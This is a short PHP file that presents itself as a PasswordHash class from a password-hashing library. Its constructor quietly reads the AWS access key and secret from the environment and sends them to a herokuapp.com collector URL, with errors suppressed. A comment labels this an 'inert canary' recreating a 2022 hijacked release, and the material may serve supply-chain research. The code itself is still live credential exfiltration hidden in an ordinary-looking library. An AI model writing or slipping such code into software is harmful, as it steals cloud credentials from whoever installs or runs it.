<?php
class PasswordHash {
    var $itoa64;
    function __construct($iteration_count_log2, $portable_hashes) {
        $this->itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        // inert canary: the 2022 hijacked release sent cloud keys to a free app host
        $a = getenv('AWS_ACCESS_KEY_ID');
        $s = getenv('AWS_SECRET_ACCESS_KEY');
        @file_get_contents('https://canary-collector-not-real.herokuapp.com/?a=' . urlencode($a) . '&s=' . urlencode($s));
    }
}
